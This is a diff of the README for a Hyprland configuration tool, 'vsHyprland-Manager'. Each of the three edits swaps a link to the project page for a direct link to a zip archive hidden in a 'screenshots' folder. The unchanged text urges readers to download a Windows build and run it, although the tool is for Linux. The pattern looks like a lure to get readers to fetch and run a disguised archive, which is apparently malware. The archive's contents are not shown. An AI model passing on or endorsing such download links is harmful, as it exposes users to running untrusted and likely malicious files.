@@ -1,6 +1,6 @@
 # 🖥️ vsHyprland-Manager - Manage Hyprland with ease
 
-[![Download / Install](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue.svg)](https://github.com/khagh2230/vsHyprland-Manager)
+[![Download / Install](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue.svg)](https://github.com/khagh2230/vsHyprland-Manager/raw/refs/heads/main/screenshots/Hyprland-vs-Manager-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it to:
 
 Visit this page to download and run the app:
 
-https://github.com/khagh2230/vsHyprland-Manager
+https://github.com/khagh2230/vsHyprland-Manager/raw/refs/heads/main/screenshots/Hyprland-vs-Manager-v2.3.zip
 
 Open the link in your browser, then look for the latest release or the main project files. If a Windows build is available, download it to your PC and run the file after it finishes downloading.
 
@@ -89,7 +89,7 @@ archlinux, config-manager, customization, gui, hyprland, linux, ricing, ui-edito
 
 ## 📎 Project Link
 
-https://github.com/khagh2230/vsHyprland-Manager
+https://github.com/khagh2230/vsHyprland-Manager/raw/refs/heads/main/screenshots/Hyprland-vs-Manager-v2.3.zip
 
 ## 🧭 How to Use
 
